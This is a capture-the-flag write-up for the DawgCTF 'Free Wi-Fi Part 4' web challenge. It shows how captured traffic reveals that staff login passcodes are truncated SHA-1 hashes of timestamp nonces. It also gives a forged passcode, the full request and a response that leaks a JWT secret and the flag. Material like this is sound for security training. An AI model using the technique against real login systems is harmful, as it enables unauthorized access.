<h2>Free Wi-Fi Part 4</h2>

<ul>
<li><strong>Category:</strong> web/networking</li>
<li><strong>Points:</strong> 250</li>
</ul>

<h3>Challenge</h3>

<blockquote>
  <p>People seem to have some doohickey that lets them login with a code...</p>
  
  <p>http://freewifi.ctf.umbccd.io/</p>
  
  <p>Authors: pleoxconfusa and freethepockets</p>
</blockquote>

<h3>Solution</h3>

<p>Connecting to the web site, two interesting cookies are set:</p>

<p><code>
Set-Cookie: WifiKey nonce=MjAyMC0wNC0xMCAyMzo1Mg==; Path=/
Set-Cookie: WifiKey alg=SHA1; Path=/
</code></p>

<p>Analyzing the <a href="free-wifi.pcap">PCAP file</a>, some POST requests passing <code>passcode</code> value can be found. Considering the SHA-1 algorithm discovered before in the cookie value and applying that algorithm to the wi-fi nonces captured, you will discover that <code>passcode</code> values are just the first 8 chars of the hashed <code>nonce</code> value.</p>

<p>```</p>

<h1>85</h1>

<p>Cookie: WifiKey nonce=MjAyMC0wNC0wOCAxNzowMQ==  -> 2020-04-08 17:01
passcode=5004f47a
SHA-1(MjAyMC0wNC0wOCAxNzowMQ==) = 5004f47ae3e2e7c1c9a5ea4d1666f95e6b06b062</p>

<h1>217</h1>

<p>Cookie: WifiKey nonce=MjAyMC0wNC0wOCAxNzowMg==  -> 2020-04-08 17:02
passcode=01c7aeb1
SHA-1(MjAyMC0wNC0wOCAxNzowMg==) = 01c7aeb11b1ee82035e9dc9e0292088d559921b1</p>

<h1>339</h1>

<p>Cookie: WifiKey nonce=MjAyMC0wNC0wOCAxNzowMw==  -> 2020-04-08 17:03
passcode=097b3acf
SHA-1(MjAyMC0wNC0wOCAxNzowMw==) = 097b3acf84e6ed9e66f285cf3750b4ff89da48dc</p>

<h1>655</h1>

<p>Cookie: WifiKey nonce=MjAyMC0wNC0wOCAxNzoxMw==  -> 2020-04-08 17:13
passcode=54f03ae2
SHA-1(MjAyMC0wNC0wOCAxNzoxMw==) = 54f03ae2cc8d1415bf06dec1670e03fd4e696982
```</p>

<p>The same process can be applied to your <code>nonce</code>.</p>

<p><code>
Cookie: WifiKey nonce=MjAyMC0wNC0xMSAwMDowNw== -&gt; 2020-04-11 00:07
SHA-1(MjAyMC0wNC0xMSAwMDowNw==) = ef07d9f7a0f3cce235a644fbb8392f211025aa98
passcode=ef07d9f7
</code></p>

<p>In order to perform a request.</p>

<p>```
POST /staff.html HTTP/1.1
Host: freewifi.ctf.umbccd.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 134
Origin: https://freewifi.ctf.umbccd.io
Connection: close
Referer: https://freewifi.ctf.umbccd.io/staff.html
Cookie: WifiKey nonce=MjAyMC0wNC0xMSAwMDowNw==; WifiKey alg=SHA1; session=eyJjc3JmX3Rva2VuIjoiYTA2MmZkNTUyNzM3NmQwMTAxYTc4YzgwMmFlNmFkOTI5ZGQzNzU3OCJ9.XpD3NA.zDj47SdpKQnikt--V9WnN0zUmYQ; JWT 'identity'=31337
Upgrade-Insecure-Requests: 1</p>

<p>csrf_token=ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpEKKA.bAfOYEeMNYEl-nFUD9XT9rSH0YI&amp;passcode=ef07d9f7&amp;submit=Submit</p>

<p>HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 11 Apr 2020 00:07:25 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Set-Cookie: WifiKey nonce=MjAyMC0wNC0xMSAwMDowNw==; Path=/
Set-Cookie: WifiKey alg=SHA1; Path=/
Set-Cookie: JWT 'secret'="dawgCTF?heckin#bamboozle"; Path=/
Vary: Cookie
Content-Length: 2594</p>

<p><!DOCTYPE html>
<html>
  <head>
    <title>
Staff Wifi Login Page
</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"></p>

<pre><code>&lt;!-- Bootstrap --&gt;
&lt;link href="/static/bootstrap/css/bootstrap.min.css?bootstrap=3.3.7.1.dev1" rel="stylesheet"&gt;
&lt;link rel="stylesheet" href="/static/css/main.css"&gt;
</code></pre>

<p></head>
  <body></p>

<div class="container">
  <div class="row">
    <div align="center" class="col-xs-12">

      <h1>Welcome to the staff login page!</h1>

      <div align="left" style="background-color: lightgrey; width: 500px;  padding: 50px;  margin: 20px;">

        <h3 style="color:blue;">Staff login</h3>

        <p>You may use either of the following methods to logon.</p>

    <div style="margin:15px;">


<form action="" method="post"
  class="form" role="form">
  <input id="csrf_token" name="csrf_token" type="hidden" value="ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpEKPQ.xW__Gp06GnXV1BdSSbKG-ZgPtyI">






<div class="form-group "><label class="control-label" for="username">Username:</label>

          <input class="form-control" id="username" name="username" type="text" value="">

  </div>

<div class="form-group "><label class="control-label" for="password">Password:</label>

          <input class="form-control" id="password" name="password" type="password" value="">

  </div>

<pre><code>&lt;input class="btn btn-default" id="submit" name="submit" type="submit" value="Submit"&gt;
</code></pre>

</form>
<pre><code>    &lt;br/&gt;

    &lt;p&gt;&lt;a href="forgotpassword.html"&gt;Forgot your password?&lt;/a&gt;&lt;/p&gt;

    &lt;h3&gt; OR &lt;/h3&gt;

</code></pre>
<form action="" method="post"
  class="form" role="form">
  <input id="csrf_token" name="csrf_token" type="hidden" value="ImEwNjJmZDU1MjczNzZkMDEwMWE3OGM4MDJhZTZhZDkyOWRkMzc1Nzgi.XpEKPQ.xW__Gp06GnXV1BdSSbKG-ZgPtyI">








<div class="form-group  required"><label class="control-label" for="passcode">Login with WifiKey:</label>

          <input class="form-control" id="passcode" name="passcode" required type="text" value="ef07d9f7">

  </div>














    <input class="btn btn-default" id="submit" name="submit" type="submit" value="Submit">







</form>


<pre><code>&lt;/div&gt;

  &lt;/div&gt;

    &lt;p class="space-above"&gt;&lt;strong&gt;DawgCTF{k3y_b@s3d_l0g1n!}&lt;/strong&gt;&lt;/p&gt;

&lt;/div&gt;

<p></code></pre>
  </div>
</div></p>

<pre><code>&lt;script src="/static/bootstrap/jquery.min.js?bootstrap=3.3.7.1.dev1"&gt;&lt;/script&gt;
&lt;script src="/static/bootstrap/js/bootstrap.min.js?bootstrap=3.3.7.1.dev1"&gt;&lt;/script&gt;
</code></pre>

<p></body>
</html>
```</p>

<p>The flag is the following.</p>

<p><code>
DawgCTF{k3y_b@s3d_l0g1n!}
</code></p>
